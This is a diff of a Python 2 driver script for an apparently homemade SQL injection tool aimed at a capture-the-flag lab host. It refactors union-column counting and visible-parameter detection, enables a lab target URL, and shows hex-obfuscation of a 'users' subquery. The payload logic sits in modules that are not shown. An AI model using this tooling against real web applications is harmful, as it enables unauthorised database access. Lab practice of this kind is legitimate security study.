@@ -52,17 +52,24 @@ def test_obfuscation():
     hexencoded += obfuscate_subquery(obfuscate, 'hex', '\'users\'') + ')'
     print hexencoded
 
-def test_sqli_info(page):
-    
-    fang = injector.Injector(page, "")
-    report = reporter.Reporter()
-
+def num_columns(fang, verbose):
     # Get column data for union statement
-    print '\n### Basic Page Structure ###'
+    
     num_columns = fang.get_num_columns() 
-    report.columns_in_statement(num_columns)
+
+    if verbose:
+        reporter.Reporter().columns_in_statement(num_columns)
+
+    return num_columns
+
+def magic_num(fang, verbose):
+
     magic_num = int(fang.get_visible_param())
-    print '\tMagic Param','\t', magic_num
+
+    if verbose:
+        reporter.Reporter().magic_number(magic_num)
+
+    return magic_num
 
 def test_pwn(num_columns, magic_num):
     # Get DB params
@@ -115,7 +122,7 @@ if __name__ == '__main__':
 
     # Instantiate classes used
     # CTF6
-    #page = 'http://192.168.83.134/index.php?id=1'
+    page = 'http://192.168.83.134/index.php?id=1'
     #page = 'http://192.168.83.130/cat.php?id=1'
     build = builder.Builder(page, mysql_params)
     store = datastore.Store()
@@ -125,15 +132,18 @@ if __name__ == '__main__':
     parse = parser.Parser(store)
     obfuscate = obfuscator.Obfuscator()
 
-    num_columns = fang.get_num_columns() 
+    num_cols = num_columns(fang, True)
+    magic_num = magic_num(fang, True)
+
+    #num_columns = fang.get_num_columns() 
     #magic_num = int(fang.get_visible_param())
 
-    magic_num_string = build.magic_num_string(num_columns)
+    #magic_num_string = build.magic_num_string(num_columns)
 
-    pre = scan.page(page)
-    post = scan.page(magic_num_string)
-    magic_num = parse.get_visible_nums(parse.html_diff(pre, post))
-    print num_columns, magic_num
+    #pre = scan.page(page)
+    #post = scan.page(magic_num_string)
+    #magic_num = parse.get_visible_nums(parse.html_diff(pre, post))
+    #print num_columns, magic_num
 
 
     """
